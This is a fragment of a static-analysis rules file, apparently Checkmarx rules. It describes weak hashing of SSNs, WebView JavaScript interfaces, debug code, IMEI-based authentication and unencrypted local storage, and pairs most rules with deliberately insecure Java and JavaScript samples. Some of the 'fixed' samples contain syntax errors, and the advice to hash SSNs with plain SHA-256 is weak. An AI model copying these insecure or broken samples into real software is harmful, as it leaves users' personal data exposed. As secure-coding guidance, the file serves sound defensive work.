&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Always use strong, modern algorithms for encryption, hashing, and so on.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not use weak, outdated, or obsolete algorithms.&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure you select the correct cryptographic mechanism according to the specific requirements.&amp;#160;&lt;/li&gt;
&lt;li&gt;Passwords should be protected with a dedicated password protection scheme, such as bcrypt, scrypt, PBKDF2, or Argon2.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use SHA-1, MD5, or any other weak hash algorithm to protect passwords or personal data. Instead, use a stronger hash such as SHA-256&amp;#160;when a secure hash is required.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not use DES, Triple-DES, RC2, or any other weak&amp;#160;encryption algorithm&amp;#160;to protect passwords or personal data. Instead, use a stronger encryption algorithm&amp;#160;such as AES&amp;#160;to protect personal data.&amp;#160;&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not use weak encryption modes such as ECB, or rely on insecure defaults. Explicitly specify a stronger encryption mode, such as GCM.&amp;#160;&lt;/li&gt;
&lt;li&gt;For symmetric encryption, use&amp;#160;a key length&amp;#160;of&amp;#160;at least 256 bits.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Weakly Hashed PII&lt;/h4&gt;&lt;pre&gt;string protectSSN(HttpServletRequest req) {
    string socialSecurityNum = req.getParameter("SocialSecurityNo");
    
    return DigestUtils.md5Hex(socialSecurityNum);
}&lt;/pre&gt;&lt;h4&gt;Stronger Hash for PII&lt;/h4&gt;&lt;pre&gt;string protectSSN(HttpServletRequest req) {
    string socialSecurityNum = req.getParameter("SocialSecurityNo");
    
    return DigestUtils.sha256Hex(socialSecurityNum);
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1601</key><name>Side_Channel_Data_Leakage</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Sensitive information could be exposed, or malware could steal the information.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application writes personal information, such as passwords or account information, to external media such as an SD card or to a log file, or, the application sends contacts or GPS location outside the device (over HTTP, email, or SMS). This can expose sensitive information.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Ideally, don&amp;#8217;t send contacts or GPS location out of the phone at all. If it is necessary to do so, send it over an encrypted channel such as HTTPS.&lt;/li&gt;
&lt;li&gt;Ideally, don&amp;#8217;t write sensitive data to log files or to external media. If it is necessary to do so, the data should be encrypted first.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4124</key><name>Use_of_WebView_AddJavascriptInterface</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Exposing application functionality in WebView may result in exposing this functionality to a remote attack, if an attacker can control the contents of the WebView, or leakage of internal application information, if the added application interface exposes such functionality.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: transparent; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;The WebView component in Android prior to version 4.2.2 allows privilege escalation by allowing Javascript to invoke application code. &lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: transparent; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;Any Application that makes use of the vulnerable WebView component and has registered an interface could be vulnerable to malicious Javascript. The malicious Javascript is capable of accessing the functionality exposed by the interface. &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id="docs-internal-guid-77e96b4a-241c-d6e8-573a-64fbb9ea14c1"&gt;&lt;span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap; background-color: transparent;"&gt;This is especially dangerous in the Android version 4.1.2 since the default browser application has &amp;ldquo;addJavascriptInterface&amp;rdquo; registered, which enables injecting Java objects and thereby causing Remote Code Execution.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span style="font-family: Arial;"&gt;&lt;span style="line-height: 24.84px; white-space: pre-wrap;"&gt;Make sure that only the intended resources are loaded into the WebView. If there are additional resources need to be loaded then it is advised to open a new Intent without a JavaScriptInterface.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Not validating the source of the resources&lt;/h4&gt;&lt;pre&gt;WebView webView = new WebView(this);
setContentView(webView);
...
class JsObject {
     private String sensitiveInformation;
 
     ...
     public String toString() { return sensitiveInformation; }
 
}
 webView.addJavascriptInterface(new JsObject(), "injectedObject");
 webView.loadData("", "text/html", null);
 webView.loadUrl("http://www.example.com");&lt;/pre&gt;&lt;h4&gt;Validating that only content from www.example.com domain will load&lt;/h4&gt;&lt;pre&gt;WebViewclient wvclient = New WebViewClient() {
  // override the "shouldOverrideUrlLoading" hook.
  public boolean shouldOverrideUrlLoading(WebView view,String url){
    if(!url.startsWith("http://www.example.com")){
    Intent i = new Intent("android,intent.action.VIEW",
    Uri.parse(url));
    startActivity(i);
  }
}
// override the "onPageFinished" hook.
public void onPageFinished(WebView view, String url) { ...}
}
webView.setWebViewClient(wvclient);&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3602</key><name>Debuggable_App</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Tests and debugging code are not intended to be deployed to the production environment, and can create unintended entry points, thus increasing the application's attack surface. Furthermore, this code is often not properly tested or maintained, and can retain historic vulnerabilities that were fixed in other parts of the codebase. Often, debug code will contain a functional "back door", by enabling the programmer to bypass operational security mechanisms, such as authentication or access controls.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;During application development, it is common for programmers to implement specialized code, in order to ease debugging and testing. Often the programmer will even&amp;nbsp;enable the debug code to bypass security mechanisms, so as to focus the tests on the specific functionality and isolate it from the security architecture.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;This debug or test code is not removed from the codebase, and is then included in the software build and deployed to the production environment.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&amp;nbsp;- Remove all debug code before deploying or building the application. Ensure the configuration settings are not defined to enable debug mode.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Implement all test code via a dedicated test framework, which can isolate the test case code from the rest of the application.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Avoid implementing special "test code", "debugging-time" functionality, or "secret" interfaces or parameters in the application code itself.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Define and implement a standard and automatic build / deployment process, using dedicated CI / CD tools, that can automatically configure the deployed application, exclude all temporary code, and include only intended application code.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Debug Configuration&lt;/h4&gt;&lt;pre&gt;&lt;configuration&gt;
	&lt;system.web&gt;
    	&lt;compilation debug="false" /&gt;
    &lt;/system.web&gt;
&lt;/configuration&gt;&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Main in Servlet&lt;/h4&gt;&lt;pre&gt;public class AppServlet extends HttpServlet { 
	protected void doGet(HttpServletRequest request, HttpServletResponse response) 
      				throws ServletException, IOException {
      	// handle request
    }
  
  	private static String MODE = "";
  	public static void main(String[] args) {
      	// initialize app for debugging and testing
      	MODE = "DEBUGGING";
    }
}&lt;/pre&gt;&lt;h3&gt;Ruby&lt;/h3&gt;&lt;h4&gt;Internal Test Method&lt;/h4&gt;&lt;pre&gt;class AppClass
	def run_app
      # Run the app
    end
  	def test_app
      # Test and debug the app
    end
end&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1600</key><name>Poor_Authorization_and_Authentication</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If a device hardware identifier is being used to identify the mobile device, and by extension the users themselves, this could be abused or bypassed in various ways. In general, this is a weak form of authentication and can allow an attacker to impersonate another device, and&amp;nbsp;even lead to accidental cases of mistaken identity.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Furthermore, depending on the specific usage scenario, this could be considered a leak of personally identifiable information (PII) or other private data, such as IMEI of users' mobile devices.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The mobile app collects device-specific identifiers, such as IMEI, and sends this to the app server. This is often used as a sole device identifier, serving as a proxy for user authentication.&lt;/p&gt;
&lt;p&gt;However, these details are not reliable, and can sometimes return bogus information. For example, mobile devices without a telephony component (e.g. tablet) would not have this type of identifier; some phones contain bugs wherein this data is not uniquely deterministic, and can return junk data or identical values for all devices of the same model. Additionally,&amp;nbsp;this hardware identifier might survive device resets, causing mis-identification if a user wipes his mobile device and passes it to another user.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Moreover, if the app server collects and correlates device-specific PII, e.g. IMEI, this will be considered a privacy violation.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Finally, reading this data will typically require elevated privileges for the mobile app, e.g. &lt;code&gt;READ_PHONE_STATE&lt;/code&gt; on Android.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&amp;nbsp;- Avoid collecting and tracking hardware-specific identifiers, or any other form of PII.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- If appropriate, implement strong user-specific authentication instead of device authentication, for example user passwords.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- If it is required to identify the device,&amp;nbsp;prefer app-specific (or installation-specific) identifiers over global device identifiers such as IMEI. In particular, use an app-generated UUID during installation.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Sending hardware-specific IMEI&lt;/h4&gt;&lt;pre&gt;public String getDeviceId() { 
  	TelephonyManager telMgr;
  	telMgr = (TelephonyManager) getContext().getSystemService(Context.TELEPHONY_SERVICE);
  	// Reads mobile device's IMEI, hopefully
  	return telMgr.getDeviceId()
}

public void sendToServer(String data) {
	HttpURLConnection connection = (HttpURLConnection) SERVER_URL.openConnection();
  	connection.setDoOutput(true);
    
  	String id = getDeviceId(); 
  
	OutputStream stream = new BufferedOutputStream(connection.getOutputStream);
  	stream.write(String.format("id=%s&amp;", id).getBytes());
  	stream.write(data.getBytes());
  	stream.flush();
  
  	connection.disconnect(); 
}
  &lt;/pre&gt;&lt;h4&gt;Sending installation-specific identifier&lt;/h4&gt;&lt;pre&gt;public String getDeviceId() { 
  	String id = readIdFromInstallationFile(getContext()); 
  	// Alternatively, set a one-time UUID, and store it for next use
  	// Can also generate and save UUID during installation instead
	if (id == null) {
      	id = UUID.randomUUID().toString(); 
      	writeIdToInstallationFile(getContext(), id);
    }

  	return id;
}

public void sendToServer(String data) {
	HttpURLConnection connection = (HttpURLConnection) SERVER_URL.openConnection();
  	connection.setDoOutput(true);
    
  	String id = getDeviceId(); 
  	
  	try {
      OutputStream stream = new BufferedOutputStream(connection.getOutputStream);
      stream.write(String.format("id=%s&amp;", id).getBytes());
      stream.write(data.getBytes());
      stream.flush();
    } finally {  
  		connection.disconnect(); 
    }
}
  &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2702</key><name>Non_Encrypted_Data_Storage</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker that has access to a user's client computer or device, will be able to retrieve the user's&amp;#160;sensitive personal data (PII) from the client storage. This would be detrimental to the user and harm their privacy, and could&amp;#160;cause reputational damage, financial loss, and even lead to identity theft.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application stores sensitive data, such as PII (Personally Identifiable Information), on the client browser or device. The application uses insecure forms of storage, which do not inherently provide any protection from unauthorized access. This data is not encrypted or sanitized before being stored, thus a malicious entity with access to the device or browser could easily retrieve the user's data.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Avoid&amp;#160;storing sensitive data, such as PII, on unprotected clients.&amp;#160;&lt;/li&gt;
&lt;li&gt;If PII or other sensitive data must be stored on the client, ensure it is encrypted or otherwise protected.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;User Data Stored in Local Storage&lt;/h4&gt;&lt;pre&gt;function storeUserData() { 
	var accountId = getUserAccount();
	localStorage.setItem('accountId', accountId);
}

&lt;/pre&gt;&lt;h4&gt;User Data in Globals instead of Persistent Storage&lt;/h4&gt;&lt;pre&gt;var globalAccountId; // Cache user data for application use

function storeUserData() { 
	var accountId = getUserAccount();
	
	  // localStorage.setItem('accountId', accountId);
	// Do not store user data in persistent storage
	globalAccountId = accountId; 
}

&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1594</key><name>Failure_To_Implement_Least_Privilege</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Privilege / Sandbox Issues&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Category ID: &lt;/b&gt;265&lt;span style="font-style:italic; font-size:80%"&gt; (Category)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_265_Description" id="oc_265_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Weaknesses in this category occur with improper enforcement of
sandbox environments, or the improper handling, assignment, or management of
privileges.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_265_Potential Mitigations" id="oc_265_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Very carefully manage the setting, management and handling of
privileges. Explicitly manage trust zones in the software.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Follow the principle of least privilege when assigning access rights
to entities in a software system.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_265_Relationships" id="oc_265_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;264&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=264" target="_blank"&gt;Permissions, Privileges, and Access Controls&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;266&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=266" target="_blank"&gt;Incorrect Privilege Assignment&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;267&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=267" target="_blank"&gt;Privilege Defined With Unsafe Actions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;268&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=268" target="_blank"&gt;Privilege Chaining&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;269&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=269" target="_blank"&gt;Improper Privilege Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;271&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=271" target="_blank"&gt;Privilege Dropping / Lowering Errors&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;274&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=274" target="_blank"&gt;Improper Handling of Insufficient Privileges&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;610&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=610" target="_blank"&gt;Externally Controlled Reference to a Resource in Another Sphere&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;648&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=648" target="_blank"&gt;Incorrect Use of Privileged APIs&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;250&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=250" target="_blank"&gt;Execution with Unnecessary Privileges&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;619&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=619" target="_blank"&gt;Dangling Database Cursor ('Cursor Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
